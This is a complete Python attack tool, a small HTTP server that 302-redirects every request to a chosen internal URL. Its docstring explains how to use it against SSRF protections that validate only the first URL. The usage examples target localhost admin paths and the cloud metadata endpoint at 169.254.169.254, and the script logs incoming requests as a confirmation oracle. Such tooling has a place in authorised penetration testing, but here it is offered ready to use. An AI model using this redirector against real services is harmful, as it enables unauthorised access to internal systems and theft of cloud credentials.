#!/usr/bin/env python3
"""ssrf-redirect — a tiny HTTP server that 302-redirects to an internal URL.

For SSRF filters that validate the FIRST URL (must be your host / public) but then
follow redirects. You submit http://YOUR_IP:PORT/ to the vulnerable feature; it
fetches you, you bounce it to the internal target it would otherwise refuse.

Also useful to bypass DNS-based allowlists and to probe many internal targets fast.

Usage:
    python3 ssrf-redirect.py [port] [target]

Examples:
    python3 ssrf-redirect.py 8000 http://127.0.0.1/admin
    python3 ssrf-redirect.py 8000 http://169.254.169.254/latest/meta-data/

Then point the SSRF feature at:  http://YOUR_IP:8000/
Every request you receive is logged (so it doubles as a confirm oracle).
"""
import sys
import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TARGET = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1/"


class Redir(BaseHTTPRequestHandler):
    def do_GET(self):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] {self.client_address[0]} {self.command} {self.path} "
              f"UA={self.headers.get('User-Agent','-')} -> 302 {TARGET}")
        sys.stdout.flush()
        self.send_response(302)
        self.send_header("Location", TARGET)
        self.end_headers()

    do_POST = do_GET

    def log_message(self, *a):
        pass


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    srv = ThreadingHTTPServer(("0.0.0.0", port), Redir)
    print(f"[*] redirector on 0.0.0.0:{port}  ->  {TARGET}  (Ctrl-C to stop)")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] bye")


if __name__ == "__main__":
    main()
